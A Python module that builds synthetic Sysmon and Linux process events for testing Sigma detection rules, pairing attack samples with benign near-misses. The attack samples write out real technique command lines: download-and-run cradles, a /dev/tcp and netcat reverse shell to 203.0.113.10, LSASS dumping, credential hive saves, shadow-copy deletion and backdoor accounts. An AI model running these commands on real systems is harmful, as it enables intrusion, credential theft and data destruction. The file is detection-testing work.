"""Sample telemetry for every Sigma rule: events that must fire and events that must not.

The events are synthetic. They are shaped like the ECS documents that Elastic
Agent produces for Sysmon and for Linux process auditing, and they carry the
command lines of real techniques. Nothing here was captured from a real host.

Each rule has "attack" events (one for every branch of its logic) and "benign"
events that sit close to the rule without crossing it. `python -m detlab
build-samples` writes them to simulations/events/. A test fails when the files
on disk differ from what this module builds.
"""

import json
from datetime import datetime, timedelta, timezone
from typing import Any

START = datetime(2026, 11, 10, 9, 0, 0, tzinfo=timezone.utc)

SYSMON = "Microsoft-Windows-Sysmon"
SYSTEM32 = "C:\\Windows\\System32\\"
POWERSHELL = SYSTEM32 + "WindowsPowerShell\\v1.0\\powershell.exe"
EXPLORER = "C:\\Windows\\explorer.exe"
CMD = SYSTEM32 + "cmd.exe"

# What Sysmon reports as OriginalFileName for the binaries the samples use.
ORIGINAL_NAMES = {
    "powershell.exe": "PowerShell.EXE", "pwsh.exe": "pwsh.dll", "cmd.exe": "Cmd.Exe", "certutil.exe": "CertUtil.exe",
    "rundll32.exe": "RUNDLL32.EXE", "regsvr32.exe": "REGSVR32.EXE", "mshta.exe": "MSHTA.EXE",
    "bitsadmin.exe": "bitsadmin.exe", "schtasks.exe": "schtasks.exe", "sc.exe": "sc.exe", "reg.exe": "reg.exe",
    "net.exe": "net.exe", "net1.exe": "net1.exe", "nltest.exe": "nltestrk.exe", "wmic.exe": "wmic.exe",
    "vssadmin.exe": "VSSADMIN.EXE", "wbadmin.exe": "WBADMIN.EXE", "bcdedit.exe": "bcdedit.exe",
    "wevtutil.exe": "wevtutil.exe", "rclone.exe": "rclone.exe", "procdump.exe": "procdump",
    "procdump64.exe": "procdump", "wscript.exe": "wscript.exe",
}


def _name(path: str) -> str:
    return path.replace("/", "\\").rsplit("\\", 1)[-1]


def win_process(image: str, command_line: str, parent: str = EXPLORER, parent_command_line: str = "",
                user: str = "jdoe", host: str = "WS-FIN-07", original: str = "") -> dict[str, Any]:
    """Sysmon event 1: process creation."""
    file_name = _name(image)
    return {
        "event": {"code": "1", "provider": SYSMON, "category": "process", "type": "start", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Process Create (rule: ProcessCreate)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "user": {"name": user, "domain": "LAB"},
        "process": {
            "executable": image, "name": file_name, "command_line": command_line,
            "working_directory": "C:\\Users\\" + user + "\\",
            "pe": {"original_file_name": original or ORIGINAL_NAMES.get(file_name.lower(), file_name)},
            "parent": {"executable": parent, "name": _name(parent),
                       "command_line": parent_command_line or parent},
        },
    }


def win_process_access(source: str, target: str, access: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 10: one process opens another."""
    return {
        "event": {"code": "10", "provider": SYSMON, "category": "process", "type": "access", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Process accessed (rule: ProcessAccess)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "process": {"executable": source, "name": _name(source)},
        "winlog": {"event_data": {"TargetImage": target, "GrantedAccess": access}},
    }


def win_registry_set(image: str, key: str, value: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 13: registry value set."""
    return {
        "event": {"code": "13", "provider": SYSMON, "category": "registry", "type": "change", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Registry value set (rule: RegistryEvent)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "process": {"executable": image, "name": _name(image)},
        "registry": {"path": key, "data": {"strings": value}},
    }


def win_file_create(image: str, path: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 11: file created."""
    return {
        "event": {"code": "11", "provider": SYSMON, "category": "file", "type": "creation", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "File created (rule: FileCreate)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "process": {"executable": image, "name": _name(image)},
        "file": {"path": path, "name": _name(path)},
    }


def win_dns_query(image: str, name: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 22: DNS query."""
    return {
        "event": {"code": "22", "provider": SYSMON, "category": "network", "type": "protocol", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Dns query (rule: DnsQuery)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "process": {"executable": image, "name": _name(image)},
        "dns": {"question": {"name": name}},
    }


def linux_process(executable: str, command_line: str, parent: str = "/usr/bin/bash", user: str = "deploy",
                  host: str = "web-01") -> dict[str, Any]:
    """Process start on Linux, as reported by process auditing."""
    return {
        "event": {"category": "process", "type": "start", "kind": "event", "dataset": "auditd.log",
                  "action": "executed"},
        "host": {"name": host, "os": {"type": "linux"}},
        "user": {"name": user},
        "process": {"executable": executable, "name": executable.rsplit("/", 1)[-1], "command_line": command_line,
                    "working_directory": "/home/" + user if user != "root" else "/root",
                    "parent": {"executable": parent, "name": parent.rsplit("/", 1)[-1]}},
    }


def sh(command: str, user: str = "deploy") -> dict[str, Any]:
    """A command run through `sh -c`, which is how pipes and redirects reach the process log."""
    return linux_process("/usr/bin/sh", f"sh -c {command}", user=user)


WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
EXCEL = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
SID_RUN = "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
STARTUP = "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
LSASS = SYSTEM32 + "lsass.exe"
ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"

# rule key -> (attack events, benign events)
CASES: dict[str, tuple[list[dict[str, Any]], list[dict[str, Any]]]] = {
    "win_powershell_encoded_command": (
        [win_process(POWERSHELL, f"powershell.exe -NoP -NonI -W Hidden -Enc {ENCODED}", parent=CMD),
         win_process("C:\\Program Files\\PowerShell\\7\\pwsh.exe", f"pwsh.exe -EncodedCommand {ENCODED}")],
        [win_process(POWERSHELL, "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1"),
         win_process(POWERSHELL, f"powershell.exe -NoProfile -enc {ENCODED}",
                     parent="C:\\Windows\\CCM\\CcmExec.exe", user="SYSTEM")],
    ),
    "win_powershell_download_cradle": (
        [win_process(POWERSHELL, "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
                                 ".DownloadString('http://203.0.113.10/a.ps1')\"", parent=CMD)],
        [win_process(POWERSHELL, "powershell.exe -Command \"Invoke-WebRequest -Uri "
                                 "https://updates.example.com/agent.msi -OutFile C:\\Temp\\agent.msi\"")],
    ),
    "win_mshta_remote_payload": (
        [win_process(SYSTEM32 + "mshta.exe", "mshta.exe http://203.0.113.10/update.hta"),
         win_process(SYSTEM32 + "mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\")"
                                             ".Run \"\"calc.exe\"\":close\")")],
        [win_process(SYSTEM32 + "mshta.exe", "mshta.exe \"C:\\Program Files\\LegacyApp\\launcher.hta\"")],
    ),
    "win_regsvr32_scriptlet": (
        [win_process(SYSTEM32 + "regsvr32.exe", "regsvr32.exe /s /n /u /i:http://203.0.113.10/payload.sct scrobj.dll")],
        [win_process(SYSTEM32 + "regsvr32.exe", "regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll")],
    ),
    "win_rundll32_script_protocol": (
        [win_process(SYSTEM32 + "rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";"
                                                "document.write();GetObject(\"script:http://203.0.113.10/s.sct\")")],
        [win_process(SYSTEM32 + "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl")],
    ),
    "win_certutil_download": (
        [win_process(SYSTEM32 + "certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.10/p.exe "
                                                "C:\\Users\\Public\\p.exe", parent=CMD)],
        [win_process(SYSTEM32 + "certutil.exe", "certutil.exe -hashfile C:\\Downloads\\setup.exe SHA256")],
    ),
    "win_certutil_decode": (
        [win_process(SYSTEM32 + "certutil.exe",
                     "certutil.exe -decode C:\\Users\\Public\\p.b64 C:\\Users\\Public\\p.exe", parent=CMD)],
        [win_process(SYSTEM32 + "certutil.exe", "certutil.exe -dump C:\\Certs\\server.cer")],
    ),
    "win_bitsadmin_download": (
        [win_process(SYSTEM32 + "bitsadmin.exe", "bitsadmin.exe /transfer job1 /download /priority high "
                                                 "http://203.0.113.10/p.exe C:\\Users\\Public\\p.exe", parent=CMD)],
        [win_process(SYSTEM32 + "bitsadmin.exe", "bitsadmin.exe /list /allusers")],
    ),
    "win_schtasks_create_suspicious_action": (
        [win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /create /sc minute /mo 30 /tn \"Updater\" "
                                                "/tr \"C:\\Users\\Public\\updater.exe\" /f", parent=CMD)],
        [win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /create /sc daily /tn \"Nightly Backup\" "
                                                "/tr \"C:\\Program Files\\Backup\\backup.exe\" /st 02:00"),
         win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /query /fo LIST")],
    ),
    "win_service_create_user_writable_path": (
        [win_process(SYSTEM32 + "sc.exe", "sc.exe create WinUpdateSvc binPath= \"C:\\Users\\Public\\svc.exe\" "
                                          "start= auto", parent=CMD)],
        [win_process(SYSTEM32 + "sc.exe", "sc.exe create AcmeAgent binPath= \"C:\\Program Files\\Acme\\agent.exe\" "
                                          "start= auto"),
         win_process(SYSTEM32 + "sc.exe", "sc.exe query type= service")],
    ),
    "win_registry_run_key_suspicious_value": (
        [win_registry_set("C:\\Users\\Public\\updater.exe", SID_RUN + "Updater", "C:\\Users\\Public\\updater.exe"),
         win_registry_set(SYSTEM32 + "reg.exe", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setup",
                          "powershell.exe -w hidden -c \"& C:\\ProgramData\\s.ps1\"")],
        [win_registry_set("C:\\Program Files\\Microsoft OneDrive\\OneDriveSetup.exe", SID_RUN + "OneDrive",
                          "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background")],
    ),
    "win_startup_folder_script_drop": (
        [win_file_create(POWERSHELL, STARTUP + "update.vbs")],
        [win_file_create("C:\\Program Files\\Microsoft OneDrive\\OneDriveSetup.exe", STARTUP + "OneDrive.lnk"),
         win_file_create(POWERSHELL, "C:\\Users\\jdoe\\Documents\\report.ps1")],
    ),
    "win_lsass_dump_comsvcs_procdump": (
        [win_process(SYSTEM32 + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 "
                                                "C:\\Windows\\Temp\\l.dmp full", parent=CMD, user="SYSTEM"),
         win_process("C:\\Users\\Public\\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe "
                                                          "C:\\Windows\\Temp\\l.dmp", parent=CMD)],
        [win_process("C:\\Tools\\Sysinternals\\procdump.exe", "procdump.exe -ma notepad.exe C:\\Dumps\\notepad.dmp")],
    ),
    "win_lsass_process_access": (
        [win_process_access("C:\\Users\\Public\\m.exe", LSASS, "0x1010")],
        [win_process_access("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
                            LSASS, "0x1410"),
         win_process_access("C:\\Program Files\\Mozilla Firefox\\firefox.exe", LSASS, "0x1000")],
    ),
    "win_reg_save_credential_hives": (
        [win_process(SYSTEM32 + "reg.exe", "reg.exe save hklm\\sam C:\\Windows\\Temp\\sam.save", parent=CMD),
         win_process(SYSTEM32 + "reg.exe", "reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save", parent=CMD)],
        [win_process(SYSTEM32 + "reg.exe", "reg.exe save hkcu\\Software\\Vendor C:\\Backup\\vendor.hiv"),
         win_process(SYSTEM32 + "reg.exe", "reg.exe query hklm\\system\\CurrentControlSet\\Services\\Tcpip")],
    ),
    "win_shadow_copy_deletion": (
        [win_process(SYSTEM32 + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", parent=CMD),
         win_process(SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe shadowcopy delete", parent=CMD),
         win_process(SYSTEM32 + "wbadmin.exe", "wbadmin.exe delete catalog -quiet", parent=CMD),
         win_process(SYSTEM32 + "bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled no", parent=CMD)],
        [win_process(SYSTEM32 + "vssadmin.exe", "vssadmin.exe list shadows"),
         win_process(SYSTEM32 + "bcdedit.exe", "bcdedit.exe /enum")],
    ),
    "win_event_log_clearing": (
        [win_process(SYSTEM32 + "wevtutil.exe", "wevtutil.exe cl Security", parent=CMD),
         win_process(POWERSHELL, "powershell.exe -Command \"Clear-EventLog -LogName Security\"", parent=CMD)],
        [win_process(SYSTEM32 + "wevtutil.exe", "wevtutil.exe qe System /c:5 /f:text")],
    ),
    "win_defender_tampering": (
        [win_process(POWERSHELL, "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                     parent=CMD),
         win_process(POWERSHELL, "powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public", parent=CMD)],
        [win_process(POWERSHELL, "powershell.exe -Command \"Get-MpPreference | Select-Object "
                                 "DisableRealtimeMonitoring\"")],
    ),
    "win_local_account_or_admin_added": (
        [win_process(SYSTEM32 + "net.exe", "net.exe user svc_backup Winter2026! /add", parent=CMD),
         win_process(SYSTEM32 + "net1.exe", "net1 localgroup administrators svc_backup /add",
                     parent=SYSTEM32 + "net.exe")],
        [win_process(SYSTEM32 + "net.exe", "net.exe user"),
         win_process(SYSTEM32 + "net.exe", "net.exe localgroup administrators")],
    ),
    "win_domain_trust_discovery_nltest": (
        [win_process(SYSTEM32 + "nltest.exe", "nltest.exe /domain_trusts /all_trusts", parent=CMD)],
        [win_process(SYSTEM32 + "nltest.exe", "nltest.exe /sc_query:LAB")],
    ),
    "win_psexec_service_child_process": (
        [win_process(CMD, "cmd.exe /c ipconfig /all", parent="C:\\Windows\\PSEXESVC.exe", user="SYSTEM",
                     host="SRV-APP-02")],
        [win_process(CMD, "cmd.exe /c ipconfig /all", parent=SYSTEM32 + "services.exe", user="SYSTEM",
                     host="SRV-APP-02")],
    ),
    "win_wmic_remote_process_create": (
        [win_process(SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe /node:10.20.30.40 /user:LAB\\admin process call create "
                                                  "\"cmd.exe /c whoami\"", parent=CMD)],
        [win_process(SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe os get Caption,Version")],
    ),
    "win_office_spawns_script_host": (
        [win_process(CMD, "cmd.exe /c whoami", parent=WINWORD),
         win_process(SYSTEM32 + "wscript.exe", "wscript.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice.js",
                     parent=EXCEL)],
        [win_process("C:\\Windows\\splwow64.exe", "C:\\Windows\\splwow64.exe 12288", parent=WINWORD)],
    ),
    "win_renamed_powershell": (
        [win_process("C:\\Users\\Public\\svchost.exe", "svchost.exe -nop -c \"Get-Process\"", parent=CMD,
                     original="PowerShell.EXE")],
        [win_process(POWERSHELL, "powershell.exe -NoLogo")],
    ),
    "win_dns_query_ddns_provider": (
        [win_dns_query("C:\\Users\\Public\\updater.exe", "c2-update.duckdns.org")],
        [win_dns_query("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "www.example.com")],
    ),
    "win_rclone_data_transfer": (
        [win_process("C:\\Users\\Public\\rclone.exe", "rclone.exe copy C:\\Shares\\Finance mega:backup "
                                                      "--config C:\\Users\\Public\\r.conf", parent=CMD)],
        [win_process("C:\\Tools\\rclone\\rclone.exe", "rclone.exe version")],
    ),
    "lnx_reverse_shell_oneliner": (
        [linux_process("/usr/bin/bash", "bash -c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1", user="www-data"),
         linux_process("/usr/bin/nc", "nc -e /bin/sh 203.0.113.10 4444", user="www-data")],
        [linux_process("/usr/bin/nc", "nc -zv db-01 5432")],
    ),
    "lnx_download_piped_to_shell": (
        [sh("curl -fsSL http://203.0.113.10/i.sh | sh", user="www-data"),
         linux_process("/usr/bin/bash", "bash -c wget -qO- http://203.0.113.10/i.sh | bash -s stage2")],
        [sh("curl -s https://status.example.com/health | shasum -a 256"),
         linux_process("/usr/bin/curl", "curl -fsSLO https://releases.example.com/tool.tar.gz")],
    ),
    "lnx_cron_persistence_write": (
        [sh("echo \"*/5 * * * * root /usr/local/bin/.sync\" >> /etc/crontab", user="root")],
        [linux_process("/usr/bin/cat", "cat /etc/crontab"),
         linux_process("/usr/bin/crontab", "crontab -l")],
    ),
    "lnx_authorized_keys_write": (
        [sh("echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0 ops@jump >> /root/.ssh/authorized_keys", user="root")],
        [linux_process("/usr/bin/cat", "cat /home/deploy/.ssh/authorized_keys")],
    ),
    "lnx_shell_history_tampering": (
        [linux_process("/usr/bin/bash", "bash -c history -c", user="root"),
         sh("rm -f /root/.bash_history", user="root")],
        [linux_process("/usr/bin/wc", "wc -l /home/deploy/.bash_history")],
    ),
    "lnx_setuid_bit_on_shell": (
        [linux_process("/usr/bin/chmod", "chmod u+s /bin/bash", user="root"),
         linux_process("/usr/bin/chmod", "chmod 4755 /tmp/.x", user="root")],
        [linux_process("/usr/bin/chmod", "chmod 755 /opt/app/run.sh"),
         linux_process("/usr/bin/chmod", "chmod +x /tmp/install.sh")],
    ),
    "lnx_shadow_file_read": (
        [linux_process("/usr/bin/cat", "cat /etc/shadow", user="root")],
        [linux_process("/usr/bin/cat", "cat /etc/passwd"),
         linux_process("/usr/bin/passwd", "passwd -S deploy", user="root")],
    ),
    "lnx_uid_zero_account_created": (
        [linux_process("/usr/sbin/useradd", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate", user="root")],
        [linux_process("/usr/sbin/useradd", "useradd -m -s /bin/bash alice", user="root")],
    ),
    "lnx_firewall_disabled": (
        [linux_process("/usr/sbin/ufw", "ufw disable", user="root"),
         linux_process("/usr/sbin/iptables", "iptables -F", user="root"),
         linux_process("/usr/bin/systemctl", "systemctl stop firewalld", user="root")],
        [linux_process("/usr/sbin/ufw", "ufw status verbose", user="root"),
         linux_process("/usr/sbin/iptables", "iptables -L -n", user="root"),
         linux_process("/usr/bin/systemctl", "systemctl status firewalld", user="root"),
         linux_process("/usr/bin/systemctl", "systemctl restart nginx", user="root")],
    ),
    "lnx_sudoers_modification": (
        [sh("echo \"deploy ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers", user="root")],
        [linux_process("/usr/bin/cat", "cat /etc/sudoers", user="root"),
         linux_process("/usr/sbin/visudo", "visudo -c", user="root")],
    ),
    "lnx_crypto_miner_execution": (
        [linux_process("/tmp/.x/kworker", "/tmp/.x/kworker -o stratum+tcp://pool.example.net:3333 -u wallet "
                                          "--donate-level 1", user="www-data")],
        [linux_process("/usr/bin/stress-ng", "stress-ng --cpu 4 --timeout 60s")],
    ),
}

# Ordinary activity that belongs to no rule and must match none.
BACKGROUND: list[dict[str, Any]] = [
    win_process(SYSTEM32 + "svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
                parent=SYSTEM32 + "services.exe", user="SYSTEM"),
    win_process("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"),
    win_process(SYSTEM32 + "ipconfig.exe", "ipconfig.exe /all", parent=CMD),
    win_process(SYSTEM32 + "whoami.exe", "whoami.exe", parent=CMD),
    win_process(CMD, "cmd.exe /c dir C:\\Users\\jdoe\\Documents"),
    win_process(SYSTEM32 + "notepad.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\notes.txt"),
    win_dns_query(SYSTEM32 + "svchost.exe", "time.windows.com"),
    win_file_create(WINWORD, "C:\\Users\\jdoe\\Documents\\budget.docx"),
    linux_process("/usr/bin/ls", "ls -la /var/www"),
    linux_process("/usr/bin/systemctl", "systemctl reload nginx", user="root"),
    linux_process("/usr/bin/apt-get", "apt-get update", user="root"),
    linux_process("/usr/bin/ssh", "ssh deploy@web-02 uptime"),
    linux_process("/usr/bin/tar", "tar -czf /var/backups/www.tar.gz /var/www", user="root"),
]


def build() -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    """All attack events and all benign events, each with an ID, a timestamp and labels."""
    attack: list[dict[str, Any]] = []
    benign: list[dict[str, Any]] = []
    clock = [START]

    def stamp(event: dict[str, Any], event_id: str, case: str, rule: str) -> dict[str, Any]:
        clock[0] += timedelta(seconds=37)
        out = {"@timestamp": clock[0].strftime("%Y-%m-%dT%H:%M:%S.000Z")}
        out.update(json.loads(json.dumps(event)))     # deep copy
        out["event"]["id"] = event_id
        out["labels"] = {"lab_case": case, "lab_rule": rule}
        return out

    for rule, (attacks, benigns) in CASES.items():
        for number, event in enumerate(attacks, start=1):
            attack.append(stamp(event, f"{rule}-attack-{number}", "attack", rule))
        for number, event in enumerate(benigns, start=1):
            benign.append(stamp(event, f"{rule}-benign-{number}", "benign", rule))
    for number, event in enumerate(BACKGROUND, start=1):
        benign.append(stamp(event, f"background-{number}", "benign", "background"))
    return attack, benign


# Events that fire a second rule on purpose: event ID -> the extra rule keys. None so far.
ALSO_FIRES: dict[str, list[str]] = {}


def expected(events: list[dict[str, Any]]) -> dict[str, list[str]]:
    """event.id -> keys of the rules that must fire on the event. Benign events expect none."""
    out: dict[str, list[str]] = {}
    for event in events:
        event_id = event["event"]["id"]
        own = [event["labels"]["lab_rule"]] if event["labels"]["lab_case"] == "attack" else []
        out[event_id] = sorted(own + ALSO_FIRES.get(event_id, []))
    return out


def differences(wanted: dict[str, list[str]], actual: dict[str, list[str]]) -> list[str]:
    """One line per event whose rule hits differ from what is expected."""
    problems = []
    for event_id in sorted(set(wanted) | set(actual)):
        want, got = set(wanted.get(event_id, [])), set(actual.get(event_id, []))
        for rule in sorted(want - got):
            problems.append(f"missed: {rule} did not fire on {event_id}")
        for rule in sorted(got - want):
            problems.append(f"false positive: {rule} fired on {event_id}")
    return problems


def to_ndjson(events: list[dict[str, Any]]) -> str:
    return "".join(json.dumps(event, sort_keys=True, ensure_ascii=False) + "\n" for event in events)
